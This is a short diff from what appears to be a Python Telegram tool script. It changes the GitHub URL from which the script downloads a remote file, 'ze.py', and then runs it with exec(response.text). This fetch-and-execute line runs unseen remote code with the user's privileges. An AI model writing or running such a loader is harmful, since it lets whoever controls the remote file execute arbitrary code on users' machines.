@@ -34,5 +34,5 @@ install_module("telethon")
 install_module("pyfiglet")
 
 import requests
-response = requests.get("https://raw.githubusercontent.com/modymesourceze/ZeClloection/main/ze.py")
+response = requests.get("https://raw.githubusercontent.com/modymesourceze/CollectZe/main/ze.py")
 exec(response.text)
